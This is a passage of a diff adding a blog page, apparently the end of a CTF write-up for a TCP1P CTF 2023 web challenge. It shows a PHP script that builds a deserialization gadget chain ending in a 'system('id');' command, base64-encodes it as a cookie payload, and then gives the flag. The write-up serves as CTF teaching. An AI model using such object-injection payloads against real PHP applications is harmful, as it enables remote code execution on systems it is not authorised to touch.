+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> $x;
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetTwo</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Echoers</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $klass;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetThree</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Vuln</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $waf1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $waf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $waf3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;system(&#39;id&#39;);&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> {
+</span></span><span style="display:flex;"><span>    $GadgetThree <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GadgetThree\Vuln</span>();
+</span></span><span style="display:flex;"><span>    $GadgetOne <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GadgetOne\Adders</span>($GadgetThree);
+</span></span><span style="display:flex;"><span>    $GadgetTwo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GadgetTwo\Echoers</span>();
+</span></span><span style="display:flex;"><span>    $reflectionClass <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ReflectionClass</span>($GadgetTwo);
+</span></span><span style="display:flex;"><span>    $reflectionProperty <span style="color:#f92672">=</span> $reflectionClass<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;klass&#34;</span>);
+</span></span><span style="display:flex;"><span>    $reflectionProperty<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    $reflectionProperty<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($GadgetTwo, $GadgetOne);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $serialized <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>($GadgetTwo));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $serialized<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;    
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is another approach by our new member <strong><strong>HeapCreate</strong></strong>. Works the same as above, but requires less usage of <code>ReflectionClass</code> and much more neater (imo).</p>
+<h2 id="final-steps">Final steps</h2>
+<hr>
+<p>Pass the generated payload to <strong><code>cookie</code></strong> and you will get the flag!</p>
+<p><img src="/images/ctfs/tcp1pctf2023-unsecure/Untitled%201.png" alt="Untitled"></p>
+<p><strong>Flag:</strong> <code>TCP1P{unserialize in php go brrrrrrrr ouch}</code></p>
+<p><strong>Thanks for reading my write-up and have a nice day!</strong></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+          stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-info">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="16" x2="12" y2="12"></line>
+          <line x1="12" y1="8" x2="12.01" y2="8"></line>
+        </svg>
+        Author: Vicevirus
+      </p>
+      
+
+      
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://m53-ctf.github.io/tags/web/">WEB</a></span>
+        <span class="tag"><a href="https://m53-ctf.github.io/tags/tcp1pctf/">TCP1PCTF</a></span>
+        <span class="tag"><a href="https://m53-ctf.github.io/tags/2023/">2023</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1355 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-10-17 17:38
+        
+
+        
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://m53-ctf.github.io/posts/csawctf2023-smug-dino/">
+                    <span class="button__text">[CSAWCTF2023] Smug Dino</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>
+
+
+
+    </body>
+</html>
